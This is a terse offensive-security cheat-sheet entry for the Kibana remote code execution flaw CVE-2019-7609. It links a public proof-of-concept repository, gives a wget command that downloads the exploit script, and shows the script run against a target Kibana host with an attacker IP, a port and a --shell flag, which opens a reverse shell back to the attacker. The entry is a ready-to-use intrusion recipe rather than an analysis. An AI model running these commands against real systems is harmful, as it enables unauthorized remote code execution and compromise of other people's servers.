- kibana
    - [CVE-2019-7609] 
        - https://github.com/LandGrey/CVE-2019-7609
        - wget https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/master/CVE-2019-7609-kibana-rce.py
        - python2 CVE-2019-7609-kibana-rce.py -h
        - python2 CVE-2019-7609-kibana-rce.py -u http://target.ip:5601 -host 10.8.56.2 -port 4444 --shell